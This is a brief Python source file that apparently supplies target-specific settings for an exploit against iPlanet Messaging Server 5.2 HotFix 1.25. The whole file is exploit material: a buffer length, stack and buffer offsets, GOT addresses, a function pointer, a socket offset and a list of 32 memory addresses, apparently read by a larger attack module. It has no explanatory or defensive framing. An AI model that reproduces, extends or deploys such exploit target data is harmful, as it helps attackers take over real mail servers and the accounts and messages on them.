import iplanet

class iplanet_5_2hf1_25(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 HotFix 1.25 (built Mar  3 2004)'
   baseBufLen = 0x1bc
   l7Offset = -0x2430L
   l7Imta = 0x55b228L
   l7ImtaResponse = 0x5428acL
   got = [0x5656e0L, 0x501320L, 0x501328L, 0x501330L]
   fp = 0x97fe70L
   bigBufOffset = -0x26fcL
   socketOffset = -0x3d8L
   addrs = \
      [0x5648BCL ,
       0x5B4064L ,
       0x5D5644L ,
       0x5F8C98L ,
       0x616290L ,
       0x632E50L ,
       0x650490L ,
       0x66C664L ,
       0x688BA4L ,
       0x6A52F8L ,
       0x6C18B4L ,
       0x6DD9A4L ,
       0x6FABE0L ,
       0x716CF0L ,
       0x73398CL ,
       0x74F3B4L ,
       0x76BD54L ,
       0x788570L ,
       0x7A4A74L ,
       0x7C1394L ,
       0x7DD4E0L ,
       0x7FAC44L ,
       0x828638L ,
       0x849F98L ,
       0x86C6E0L ,
       0x88E074L ,
       0x8BF190L ,
       0x8ECA50L ,
       0x908D78L ,
       0x924F0CL ,
       0x942464L ,
       0x96155CL ]
